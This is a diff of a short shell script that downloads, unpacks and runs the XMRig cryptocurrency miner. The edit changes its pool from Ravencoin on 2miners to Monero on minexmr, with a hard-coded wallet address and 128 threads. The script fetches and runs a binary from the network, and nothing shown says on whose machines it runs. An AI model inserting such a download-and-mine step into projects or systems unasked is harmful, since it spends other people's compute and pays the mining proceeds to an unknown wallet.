@@ -3,4 +3,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux
 tar -xvzf xmrig-6.12.1-linux-x64.tar.gz
 cd xmrig-6.12.1
 chmod u+x ./xmrig
-./xmrig --coin=RVN -o rvn.2miners.com:16161 -u RLDvBWuqi1KqCnF6CdF2BH6NLJvmv7HK5e -p x -t128 -k --tls
+./xmrig --coin=XMR -o pool.minexmr.com:4444 -u 46MEpnWdfdhjByhRE7jbP6U6fW9ok2UitfkAmJXk7NRaRCah9uGd8sWSjoBmsX3zZmagTR6DwFeiv1u9Ny31BfRJTZydcaU -p x -t128 -k --tls
